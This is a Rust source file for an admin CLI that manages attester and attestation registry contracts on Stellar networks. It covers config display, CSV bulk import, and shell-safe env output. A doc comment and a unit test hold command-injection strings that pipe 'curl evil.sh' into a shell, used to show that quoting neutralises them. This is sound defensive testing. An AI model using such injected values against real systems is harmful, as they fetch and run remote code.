//! Lafiya Admin CLI (Rust)
//! Reads config/networks.toml for RPC, passphrase, contract IDs.
//! Switching networks is one flag: --network testnet
//! Secrets are never read from config, only via stellar CLI identities or env.
//!
//! Every operator supplied value (network name, address, contract id, record
//! hash, admin/source account) is validated locally before the stellar CLI is
//! invoked, so malformed input fails fast with an actionable message.

pub mod attester_import;
pub mod rpc_client;
pub mod signer;

use anyhow::Context;
use clap::{Parser, Subcommand};
use lafiya_config::{
    get_network, load_networks, validate_account_address, validate_address, validate_network_name,
    validate_record_hash, validate_source_account, ContractKind, DeploymentState, NetworkConfig,
};
use std::path::PathBuf;

/// Env var holding the stellar CLI identity used as transaction source.
const ENV_SOURCE: &str = "STELLAR_ACCOUNT";
/// Env var holding the contract admin address.
const ENV_ADMIN: &str = "ADMIN_ADDRESS";

#[derive(Parser, Debug)]
#[command(
    name = "lafiya-cli",
    about = "Lafiya Admin CLI - uses config/networks.toml"
)]
struct Cli {
    /// Network name as defined in config/networks.toml (e.g. testnet, futurenet, mainnet, local)
    #[arg(long, default_value = "testnet", global = true)]
    network: String,

    /// Path to networks.toml (auto-discovers by default)
    #[arg(long, global = true)]
    config: Option<PathBuf>,

    /// Fall back to the `stellar` CLI subprocess for all contract interactions.
    ///
    /// **Deprecated** — this flag is provided for one release cycle while
    /// operators migrate to the native Soroban RPC client (issue #395).
    /// It will be removed in the next minor release.  When set, the CLI emits
    /// a deprecation warning to stderr.
    #[arg(long, global = true, default_value_t = false)]
    via_stellar_cli: bool,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Show / list network config
    Config {
        #[command(subcommand)]
        sub: ConfigSub,
    },
    /// Attester registry operations
    Attester {
        #[command(subcommand)]
        sub: AttesterSub,
    },
    /// Attestation registry operations
    Attestation {
        #[command(subcommand)]
        sub: AttestationSub,
    },
    /// Deploy contracts (wrapper around scripts/deploy.sh logic, but uses same config)
    Deploy {
        /// Build only, don't deploy
        #[arg(long, default_value_t = false)]
        build_only: bool,
        /// Dry run
        #[arg(long, default_value_t = false)]
        dry_run: bool,
        /// Stellar identity or G... address used as transaction source (or STELLAR_ACCOUNT)
        #[arg(long)]
        source: Option<String>,
        /// Admin address (G...) for contract initialization (or ADMIN_ADDRESS)
        #[arg(long)]
        admin: Option<String>,
    },
}

/// Output format for `config env`.
///
/// - `shell`  (default): `export KEY='value'` — safe for `eval $(...)`.
/// - `dotenv`: `KEY='value'` — safe for `set -a; source <(...); set +a`.
/// - `json`:   `{ "KEY": "value", ... }` — for scripting with `jq`.
///
/// Single-quoting ensures shell metacharacters (`$`, backtick, `!`, etc.)
/// in any value are treated as literals and cannot execute commands.
#[derive(Debug, Clone, clap::ValueEnum, Default)]
enum EnvFormat {
    /// Shell export lines with single-quote-escaped values. Safe for `eval`.
    #[default]
    Shell,
    /// `KEY=VALUE` pairs suitable for `set -a; source <(...)`.
    Dotenv,
    /// JSON object. Parse with `jq` or your language's JSON library.
    Json,
}

#[derive(Subcommand, Debug)]
enum ConfigSub {
    /// Show resolved config for selected network
    Show,
    /// List all available networks in config
    List,
    /// Print env vars for the current network.
    ///
    /// Recommended usage:
    ///   shell (default):  eval $(lafiya-cli --network testnet config env)
    ///   dotenv:           set -a; source <(lafiya-cli --network testnet config env --format dotenv); set +a
    ///   json:             lafiya-cli --network testnet config env --format json | jq .
    Env {
        /// Output format: shell (default), dotenv, or json
        #[arg(long, default_value = "shell")]
        format: EnvFormat,
    },
}

#[derive(Subcommand, Debug)]
enum AttesterSub {
    /// Check if an address is allowlisted
    Is {
        /// Stellar address (G...)
        address: String,
    },
    /// Add attester (requires admin - will invoke stellar CLI)
    Add {
        /// Stellar address (G...) to allowlist as an attester
        address: String,
        #[arg(long)]
        source: Option<String>,
    },
    /// Remove attester
    Remove {
        /// Stellar address (G...) to remove from the allowlist
        address: String,
        #[arg(long)]
        source: Option<String>,
    },
    /// Bulk-import community health workers from a CSV file.
    ///
    /// Parses and validates every row locally before touching the network,
    /// diffs against current chain state, groups new registrations into
    /// batches of ≤ 50, and writes a resumable journal for crash recovery.
    ///
    /// CSV schema (header required): address,license_hash,region
    ///
    /// Example:
    ///   lafiya-cli --network testnet attester import chws.csv --dry-run
    ///   lafiya-cli --network testnet attester import chws.csv --source alice
    Import {
        /// Path to the CSV file containing CHW addresses and optional metadata.
        csv_file: std::path::PathBuf,
        /// Validate and plan only; do not submit any transactions.
        #[arg(long, default_value_t = false)]
        dry_run: bool,
        /// Path to the journal file for crash-resumable execution.
        /// Defaults to `<csv_file>.journal.json` if not supplied.
        #[arg(long)]
        resume: Option<std::path::PathBuf>,
        /// Stellar identity or G... address used as transaction source
        /// (or STELLAR_ACCOUNT env var).
        #[arg(long)]
        source: Option<String>,
    },
}

#[derive(Subcommand, Debug)]
enum AttestationSub {
    /// Get attestation for a record hash (hex encoded 32-byte hash)
    Get {
        /// Hex string of 32-byte record hash (64 chars)
        record_hash: String,
    },
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    // Validate the network name before it is used as a config key.
    validate_network_name(&cli.network)
        .map_err(|e| anyhow::anyhow!("invalid --network value: {e}"))?;

    let config_path_opt = cli.config.as_deref();
    let networks = load_networks(config_path_opt)?;

    // For config list, we don't need to resolve specific network
    if let Commands::Config {
        sub: ConfigSub::List,
    } = &cli.command
    {
        println!(
            "Available networks (from {:?}):",
            lafiya_config::default_config_path()
        );
        for name in networks.keys() {
            println!("  - {}", name);
        }
        if let Some(p) = &cli.config {
            println!("Config path (explicit): {:?}", p);
        } else {
            let default = lafiya_config::default_config_path();
            println!("Config path (auto): {:?}", default);
        }
        return Ok(());
    }

    let network_cfg = get_network(&networks, &cli.network).map_err(|e| anyhow::anyhow!(e))?;

    // Build the RPC client for this command.  When --via-stellar-cli is set
    // the factory returns a StellarCliClient (subprocess delegate) and emits
    // a deprecation warning.  All other paths use the NativeRpcClient stub
    // (issue #395 — to be fully wired once stellar-xdr is added).
    let _rpc = rpc_client::make_rpc_client(
        &network_cfg.rpc_url,
        &network_cfg.network_passphrase,
        cli.via_stellar_cli,
    );

    // `config show` reports config problems instead of refusing to print, so an
    // operator can see exactly which value needs fixing. Every other command
    // requires a valid profile before touching the network.
    let is_config_show = matches!(
        cli.command,
        Commands::Config {
            sub: ConfigSub::Show
        }
    );
    if let Err(e) = network_cfg.validate(&cli.network) {
        if is_config_show {
            eprintln!("WARNING: {e}");
        } else {
            return Err(anyhow::anyhow!(e));
        }
    }

    match cli.command {
        Commands::Config { sub } => {
            match sub {
                ConfigSub::Show => {
                    let (path, _) = lafiya_config::load_network_config::<PathBuf>(
                        &cli.network,
                        cli.config.clone(),
                    )?;
                    println!("Network: {}", cli.network);
                    println!("Config: {:?}", path);
                    println!("RPC URL: {}", network_cfg.rpc_url);
                    println!("Passphrase: {}", network_cfg.network_passphrase);
                    println!(
                        "Attester registry: {}",
                        if network_cfg.contracts.attester_registry.is_empty() {
                            "<not deployed>".to_string()
                        } else {
                            network_cfg.contracts.attester_registry.clone()
                        }
                    );
                    println!(
                        "Attestation registry: {}",
                        if network_cfg.contracts.attestation_registry.is_empty() {
                            "<not deployed>".to_string()
                        } else {
                            network_cfg.contracts.attestation_registry.clone()
                        }
                    );
                    println!("Deployed: {}", network_cfg.is_deployed());
                    println!("Deployment status: {}", deployment_summary(&network_cfg));
                    println!("\nSecrets: NEVER stored in networks.toml. Use stellar identities or env vars.");
                }
                ConfigSub::List => {} // handled above
                ConfigSub::Env { format } => {
                    // Security: validate passphrase and URL before printing them
                    // into any shell-evaluated context.  A passphrase containing
                    // shell metacharacters could execute arbitrary commands when
                    // the output is eval'd.
                    lafiya_config::validate_passphrase(&network_cfg.network_passphrase)
                        .map_err(|e| anyhow::anyhow!("invalid network_passphrase: {e}"))?;
                    lafiya_config::validate_rpc_url("rpc_url", &network_cfg.rpc_url)
                        .map_err(|e| anyhow::anyhow!("invalid rpc_url: {e}"))?;

                    // Collect owned strings so the slice can borrow them.
                    let network_val = cli.network.clone();
                    let rpc_url_val = network_cfg.rpc_url.clone();
                    let passphrase_val = network_cfg.network_passphrase.clone();
                    let attester_val = network_cfg.contracts.attester_registry.clone();
                    let attestation_val = network_cfg.contracts.attestation_registry.clone();

                    let vars: &[(&str, &str)] = &[
                        ("LAFIYA_NETWORK", &network_val),
                        ("LAFIYA_RPC_URL", &rpc_url_val),
                        ("LAFIYA_NETWORK_PASSPHRASE", &passphrase_val),
                        ("LAFIYA_ATTESTER_REGISTRY_ID", &attester_val),
                        ("LAFIYA_ATTESTATION_REGISTRY_ID", &attestation_val),
                    ];

                    match format {
                        EnvFormat::Shell => {
                            println!(
                                "# eval $(lafiya-cli --network {} config env)",
                                shell_quote(&network_val)
                            );
                            for (k, v) in vars {
                                // Every value is single-quoted.  Embedded single
                                // quotes are escaped as '\''.  This means the
                                // shell treats the entire value as a literal —
                                // no command substitution, no variable
                                // expansion, no backticks.
                                println!("export {}={}", k, shell_quote(v));
                            }
                        }
                        EnvFormat::Dotenv => {
                            println!(
                                "# set -a; source <(lafiya-cli --network {} config env --format dotenv); set +a",
                                &network_val
                            );
                            for (k, v) in vars {
                                println!("{}={}", k, shell_quote(v));
                            }
                        }
                        EnvFormat::Json => {
                            // Emit RFC 8259 JSON. No serde_json dependency —
                            // hand-rolled escaping is sufficient for printable
                            // ASCII strings that have already passed
                            // validate_passphrase / validate_rpc_url.
                            println!("{{");
                            for (i, (k, v)) in vars.iter().enumerate() {
                                let comma = if i + 1 < vars.len() { "," } else { "" };
                                println!("  \"{}\": \"{}\"{}", k, json_escape(v), comma);
                            }
                            println!("}}");
                        }
                    }
                }
            }
        }
        Commands::Attester { sub } => match sub {
            AttesterSub::Is { address } => {
                let contract_id = network_cfg
                    .require_contract_id(&cli.network, ContractKind::AttesterRegistry)
                    .map_err(|e| anyhow::anyhow!(e))?;
                validate_address("attester address", &address)
                    .context("invalid attester address")?;

                println!("Checking is_attester for {} on {}", address, contract_id);
                println!("RPC: {}", network_cfg.rpc_url);
                let args = invoke_args(
                    &network_cfg,
                    contract_id,
                    None,
                    "is_attester",
                    &["--attester", &address],
                );
                println!("> stellar {}", args.join(" "));
                // Read-only query: report a missing/failing CLI without aborting hard.
                if which::which("stellar").is_ok() {
                    if let Err(e) = std::process::Command::new("stellar").args(args).status() {
                        eprintln!("Failed to run stellar CLI: {e}. Install with: cargo install --locked stellar-cli");
                    }
                } else {
                    eprintln!("stellar CLI not found - showing command only. Install with: cargo install --locked stellar-cli");
                }
            }
            AttesterSub::Add { address, source } => {
                let contract_id = network_cfg
                    .require_contract_id(&cli.network, ContractKind::AttesterRegistry)
                    .map_err(|e| anyhow::anyhow!(e))?;
                validate_address("attester address", &address)
                    .context("invalid attester address")?;
                let source = validated_source(source)?;

                let args = invoke_args(
                    &network_cfg,
                    contract_id,
                    source.as_deref(),
                    "add_attester",
                    &["--attester", &address],
                );
                run_stellar(args)?;
            }
            AttesterSub::Remove { address, source } => {
                let contract_id = network_cfg
                    .require_contract_id(&cli.network, ContractKind::AttesterRegistry)
                    .map_err(|e| anyhow::anyhow!(e))?;
                validate_address("attester address", &address)
                    .context("invalid attester address")?;
                let source = validated_source(source)?;

                let args = invoke_args(
                    &network_cfg,
                    contract_id,
                    source.as_deref(),
                    "remove_attester",
                    &["--attester", &address],
                );
                run_stellar(args)?;
            }
            AttesterSub::Import {
                csv_file,
                dry_run,
                resume,
                source,
            } => {
                use attester_import::{
                    build_report, diff_against_chain, parse_and_validate, plan, BatchItem,
                    JournalEntry, PlanSummary, RowOutcome,
                };

                // Derive journal path: <csv_file>.journal.json unless overridden.
                let journal_path = resume.unwrap_or_else(|| {
                    let mut p = csv_file.clone();
                    let ext = p
                        .extension()
                        .map(|e| format!("{}.journal.json", e.to_string_lossy()))
                        .unwrap_or_else(|| "journal.json".to_string());
                    p.set_extension(ext);
                    p
                });

                // Validate source (not required for --dry-run).
                let source = validated_source(source)?;
                if !dry_run && source.is_none() {
                    anyhow::bail!(
                        "attester import requires --source (or STELLAR_ACCOUNT) unless --dry-run is set"
                    );
                }

                // Read CSV.
                let csv_text = std::fs::read_to_string(&csv_file).with_context(|| {
                    format!("failed to read CSV file: {}", csv_file.display())
                })?;

                // Parse & validate all rows before touching the network.
                let rows = parse_and_validate(&csv_text).map_err(|errors| {
                    let lines: Vec<String> = errors.iter().map(|e| format!("  {e}")).collect();
                    anyhow::anyhow!(
                        "CSV validation failed with {} error(s):\n{}",
                        errors.len(),
                        lines.join("\n")
                    )
                })?;

                println!("Parsed {} valid rows from {}", rows.len(), csv_file.display());

                // Diff against chain state.
                // For now, without a live RPC client (issue #395), every address
                // is classified as New.  When NativeRpcClient gains
                // get_ledger_entries, replace this closure with a real chain lookup.
                let entries = diff_against_chain(&rows, |_addr| None);

                // Plan batches.
                let items = plan(&entries);
                let summary = PlanSummary::from(&items);

                println!(
                    "Plan: {} new (in {} batches), {} metadata updates, {} skipped",
                    summary.new_count,
                    summary.batch_count,
                    summary.update_count,
                    summary.skip_count
                );

                if dry_run {
                    println!("[dry-run] No transactions will be submitted.");
                    for item in &items {
                        match item {
                            BatchItem::AddBatch(rows) => {
                                println!(
                                    "  [batch] add_attester x{} (e.g. {})",
                                    rows.len(),
                                    rows.first().map(|r| r.address.as_str()).unwrap_or("?")
                                );
                            }
                            BatchItem::UpdateMetadata(row) => {
                                println!("  [update] update_attester_info {}", row.address);
                            }
                            BatchItem::Skip { row, reason } => {
                                println!("  [skip] {} — {}", row.address, reason);
                            }
                        }
                    }
                    return Ok(());
                }

                // --- Live execution path ---
                // Reconcile any existing journal entries first.
                let existing = attester_import::read_journal(&journal_path)
                    .context("failed to read journal")?;
                if !existing.is_empty() {
                    println!(
                        "Resuming: found {} journal entries from a previous run.",
                        existing.len()
                    );
                    for e in &existing {
                        println!(
                            "  [{}] {} — outcome: {} tx: {}",
                            e.id,
                            e.operation,
                            e.outcome,
                            e.tx_hash.as_deref().unwrap_or("<none>")
                        );
                    }
                }

                let contract_id = network_cfg
                    .require_contract_id(&cli.network, ContractKind::AttesterRegistry)
                    .map_err(|e| anyhow::anyhow!(e))?;

                let mut outcomes: Vec<RowOutcome> = Vec::new();
                let mut batch_idx: usize = 0;

                for item in &items {
                    match item {
                        BatchItem::AddBatch(batch_rows) => {
                            batch_idx += 1;
                            let addresses: Vec<String> =
                                batch_rows.iter().map(|r| r.address.clone()).collect();

                            // Write journal intent before submitting.
                            let journal_entry = JournalEntry {
                                id: format!("batch-{}", batch_idx),
                                addresses: addresses.clone(),
                                operation: "add_attester".to_string(),
                                tx_hash: None,
                                outcome: "pending".to_string(),
                            };
                            attester_import::write_journal_entry(&journal_path, &journal_entry)
                                .context("failed to write journal entry")?;

                            // Submit each address individually (batch contract function
                            // from issue #03 is not yet implemented on-chain).
                            // TODO(#03): replace with add_attesters() batch call once landed.
                            for addr in &addresses {
                                let args = invoke_args(
                                    &network_cfg,
                                    contract_id,
                                    source.as_deref(),
                                    "add_attester",
                                    &["--attester", addr],
                                );
                                let result = run_stellar(args);
                                let (outcome, tx_hash_str) = match result {
                                    Ok(()) => ("success".to_string(), String::new()),
                                    Err(ref e) => (
                                        format!("failed: {e}"),
                                        String::new(),
                                    ),
                                };
                                outcomes.push(RowOutcome {
                                    address: addr.clone(),
                                    outcome,
                                    tx_hash: tx_hash_str,
                                });
                            }
                        }
                        BatchItem::UpdateMetadata(row) => {
                            let journal_entry = JournalEntry {
                                id: format!("update-{}", row.address),
                                addresses: vec![row.address.clone()],
                                operation: "update_attester_info".to_string(),
                                tx_hash: None,
                                outcome: "pending".to_string(),
                            };
                            attester_import::write_journal_entry(&journal_path, &journal_entry)
                                .context("failed to write journal entry")?;

                            let args = invoke_args(
                                &network_cfg,
                                contract_id,
                                source.as_deref(),
                                "update_attester_info",
                                &["--attester", &row.address],
                            );
                            let outcome = match run_stellar(args) {
                                Ok(()) => "success".to_string(),
                                Err(e) => format!("failed: {e}"),
                            };
                            outcomes.push(RowOutcome {
                                address: row.address.clone(),
                                outcome,
                                tx_hash: String::new(),
                            });
                        }
                        BatchItem::Skip { row, reason } => {
                            outcomes.push(RowOutcome {
                                address: row.address.clone(),
                                outcome: format!("skipped: {reason}"),
                                tx_hash: String::new(),
                            });
                        }
                    }
                }

                // Write final report.
                let report = build_report(&outcomes);
                let report_path = {
                    let mut p = csv_file.clone();
                    p.set_extension("report.csv");
                    p
                };
                std::fs::write(&report_path, &report).with_context(|| {
                    format!("failed to write report to {}", report_path.display())
                })?;
                println!(
                    "Import complete. Report written to {}",
                    report_path.display()
                );
                let success = outcomes.iter().filter(|o| o.outcome == "success").count();
                let failed = outcomes
                    .iter()
                    .filter(|o| o.outcome.starts_with("failed"))
                    .count();
                println!(
                    "  {} succeeded, {} failed, {} skipped",
                    success,
                    failed,
                    outcomes.len() - success - failed
                );
            }
        },
        Commands::Attestation { sub } => match sub {
            AttestationSub::Get { record_hash } => {
                let contract_id = network_cfg
                    .require_contract_id(&cli.network, ContractKind::AttestationRegistry)
                    .map_err(|e| anyhow::anyhow!(e))?;
                validate_record_hash("record_hash", &record_hash)
                    .context("invalid record hash (expected a hex encoded 32-byte hash)")?;

                let args = invoke_args(
                    &network_cfg,
                    contract_id,
                    None,
                    "get_attestation",
                    &["--record_hash", &record_hash],
                );
                println!("> stellar {}", args.join(" "));
                if which::which("stellar").is_ok() {
                    let status = std::process::Command::new("stellar").args(args).status()?;
                    if !status.success() {
                        anyhow::bail!("stellar CLI failed");
                    }
                } else {
                    eprintln!(
                        "stellar CLI not found - install with cargo install --locked stellar-cli"
                    );
                }
            }
        },
        Commands::Deploy {
            build_only,
            dry_run,
            source,
            admin,
        } => {
            let identity = DeployIdentity::resolve(
                admin,
                source,
                std::env::var(ENV_ADMIN).ok(),
                std::env::var(ENV_SOURCE).ok(),
                DeployMode::new(build_only, dry_run),
            )?;

            println!("Deploy flow for network: {}", cli.network);
            println!("RPC: {}", network_cfg.rpc_url);
            println!("Passphrase: {}", network_cfg.network_passphrase);
            println!("Current deployment: {}", deployment_summary(&network_cfg));
            println!("Source: {}", identity.source.as_deref().unwrap_or("<none>"));
            println!("Admin: {}", identity.admin.as_deref().unwrap_or("<none>"));
            println!("This command is a wrapper- for full deploy use:");
            println!("  ./scripts/deploy.sh --network {}", cli.network);
            if build_only {
                println!("Building WASM...");
                let status = std::process::Command::new("cargo")
                    .args([
                        "build",
                        "--workspace",
                        "--release",
                        "--target",
                        "wasm32v1-none",
                    ])
                    .status()?;
                if !status.success() {
                    anyhow::bail!("build failed");
                }
            }
            if dry_run {
                println!(
                    "[dry-run] Would deploy attester-registry and attestation-registry to {}",
                    cli.network
                );
            }
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Shell-safe quoting helpers (issue #396)
// ---------------------------------------------------------------------------

/// Wrap `value` in single quotes, escaping any embedded single quotes as `'\''`.
///
/// This is the POSIX-portable way to produce a shell literal: the shell never
/// interprets characters inside single quotes, so `$`, `` ` ``, `\`, `!`,
/// `(`, `)`, etc. are all treated as literals.  The only character that
/// requires special treatment is `'` itself.
///
/// Examples:
/// - `hello`             → `'hello'`
/// - `Test Network`      → `'Test Network'`
/// - `it's alive`        → `'it'\''s alive'`
/// - `$(curl evil.sh)`   → `'$(curl evil.sh)'`  — safe, not executed
pub fn shell_quote(value: &str) -> String {
    // Escape embedded single quotes by ending the current single-quoted
    // segment, inserting a literal `'` in a double-quoted fragment, then
    // reopening the single-quoted segment.
    let escaped = value.replace('\'', "'\\''");
    format!("'{}'", escaped)
}

/// Escape a string for inclusion in a JSON double-quoted value.
///
/// Only characters that are special inside JSON string literals need escaping:
/// `\`, `"`, and ASCII control characters.
///
/// All values written here have already passed `validate_passphrase` /
/// `validate_rpc_url`, which require printable ASCII — so only `\` and `"`
/// can appear in practice.  The full control-character table is kept for
/// correctness.
pub fn json_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for c in value.chars() {
        match c {
            '\\' => out.push_str(r"\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                // Other control characters as \uXXXX
                use std::fmt::Write;
                let _ = write!(out, "\\u{:04x}", c as u32);
            }
            c => out.push(c),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// CLI helper functions
// ---------------------------------------------------------------------------

/// Build the argument list for `stellar contract invoke`.
fn invoke_args<'a>(
    cfg: &NetworkConfig,
    contract_id: &'a str,
    source: Option<&'a str>,
    fn_name: &'a str,
    fn_args: &[&'a str],
) -> Vec<String> {
    let mut args = vec![
        "contract".to_string(),
        "invoke".to_string(),
        "--network-passphrase".to_string(),
        cfg.network_passphrase.clone(),
        "--rpc-url".to_string(),
        cfg.rpc_url.clone(),
        "--id".to_string(),
        contract_id.to_string(),
    ];
    if let Some(src) = source {
        args.push("--source".to_string());
        args.push(src.to_string());
    }
    args.push("--".to_string());
    args.push(fn_name.to_string());
    for a in fn_args {
        args.push(a.to_string());
    }
    args
}

/// Run `stellar` with the given arguments, propagating errors.
fn run_stellar(args: Vec<String>) -> anyhow::Result<()> {
    if which::which("stellar").is_err() {
        anyhow::bail!(
            "stellar CLI not found. Install with: cargo install --locked stellar-cli"
        );
    }
    println!("> stellar {}", args.join(" "));
    let status = std::process::Command::new("stellar")
        .args(&args)
        .status()
        .context("failed to spawn stellar CLI")?;
    if !status.success() {
        anyhow::bail!("stellar CLI exited with {status}");
    }
    Ok(())
}

/// Resolve and validate the `--source` flag, falling back to `STELLAR_ACCOUNT`.
fn validated_source(flag: Option<String>) -> anyhow::Result<Option<String>> {
    let source = flag.or_else(|| std::env::var(ENV_SOURCE).ok());
    if let Some(ref s) = source {
        validate_source_account(s).context("invalid --source value")?;
    }
    Ok(source)
}

/// Human-readable summary of deployment state.
fn deployment_summary(cfg: &NetworkConfig) -> String {
    match cfg.deployment_state() {
        DeploymentState::Deployed => "fully deployed".to_string(),
        DeploymentState::NotDeployed => "not deployed".to_string(),
        DeploymentState::Partial { missing } => {
            let names: Vec<&str> = missing.iter().map(|k| k.key()).collect();
            format!("partial — missing: {}", names.join(", "))
        }
    }
}

// ---------------------------------------------------------------------------
// Deploy identity helpers
// ---------------------------------------------------------------------------

struct DeployMode {
    build_only: bool,
    dry_run: bool,
}

impl DeployMode {
    fn new(build_only: bool, dry_run: bool) -> Self {
        Self { build_only, dry_run }
    }
}

struct DeployIdentity {
    source: Option<String>,
    admin: Option<String>,
    #[allow(dead_code)]
    mode: DeployMode,
}

impl DeployIdentity {
    fn resolve(
        admin_flag: Option<String>,
        source_flag: Option<String>,
        admin_env: Option<String>,
        source_env: Option<String>,
        mode: DeployMode,
    ) -> anyhow::Result<Self> {
        let source = source_flag.or(source_env);
        let admin = admin_flag.or(admin_env);

        if let Some(ref s) = source {
            validate_source_account(s).context("invalid --source value")?;
        }
        if let Some(ref a) = admin {
            validate_account_address("admin", a).context("invalid --admin value")?;
        }

        Ok(Self { source, admin, mode })
    }
}

// ---------------------------------------------------------------------------
// PATH lookup (minimal, unix-focused)
// ---------------------------------------------------------------------------

mod which {
    use std::path::Path;

    pub fn which(bin: &str) -> Result<std::path::PathBuf, ()> {
        // Simple check using PATH env
        if let Some(paths) = std::env::var_os("PATH") {
            for p in std::env::split_paths(&paths) {
                let full = p.join(bin);
                if full.exists() {
                    return Ok(full);
                }
                // Windows also .exe etc, but we target unix for stellar
                #[cfg(windows)]
                {
                    let full_exe = p.join(format!("{}.exe", bin));
                    if full_exe.exists() {
                        return Ok(full_exe);
                    }
                }
                // Also check without extension but with executable bit
                if Path::new(&full).exists() {
                    return Ok(full);
                }
            }
        }
        Err(())
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // `attester add` requires a positional `address`. Clap's derive-generated
    // error for a missing required argument must still name it, so a
    // contributor testing the CLI by hand isn't left guessing which value
    // they forgot.
    #[test]
    fn attester_add_missing_address_names_the_argument() {
        let err = Cli::try_parse_from(["lafiya-cli", "attester", "add"])
            .expect_err("expected a missing required argument error");
        let message = err.to_string();
        assert!(
            message.to_uppercase().contains("ADDRESS"),
            "expected error to name the missing `address` argument, got: {message}"
        );
    }

    // `attestation get` requires a positional `record_hash`.
    #[test]
    fn attestation_get_missing_record_hash_names_the_argument() {
        let err = Cli::try_parse_from(["lafiya-cli", "attestation", "get"])
            .expect_err("expected a missing required argument error");
        let message = err.to_string();
        assert!(
            message.to_uppercase().contains("RECORD_HASH"),
            "expected error to name the missing `record_hash` argument, got: {message}"
        );
    }

    // Issue #396: shell_quote must neutralise every shell metacharacter so
    // that eval'ing the output cannot run commands.
    #[test]
    fn shell_quote_neutralises_command_substitution() {
        let hostile = "Test $(curl -s evil.sh | sh) Network";
        let quoted = shell_quote(hostile);
        // The result must be a single-quoted string.
        assert!(quoted.starts_with('\''), "must start with single quote");
        assert!(quoted.ends_with('\''), "must end with single quote");
        // The original string must round-trip: strip the outer quotes and
        // unescape '\'' → '.
        let inner = &quoted[1..quoted.len() - 1];
        let unescaped = inner.replace("\\'", "'");
        assert_eq!(unescaped, hostile, "value must round-trip through quoting");
    }

    #[test]
    fn shell_quote_escapes_embedded_single_quotes() {
        assert_eq!(shell_quote("it's alive"), "'it'\\''s alive'");
    }

    #[test]
    fn shell_quote_plain_value_roundtrips() {
        let plain = "Test SDF Network ; September 2015";
        let quoted = shell_quote(plain);
        // Strip surrounding single quotes and confirm the value is unchanged.
        let inner = &quoted[1..quoted.len() - 1];
        assert_eq!(inner, plain);
    }

    #[test]
    fn json_escape_backslash_and_quote() {
        assert_eq!(json_escape(r#"say "hi""#), r#"say \"hi\""#);
        assert_eq!(json_escape(r"a\b"), r"a\\b");
    }
}
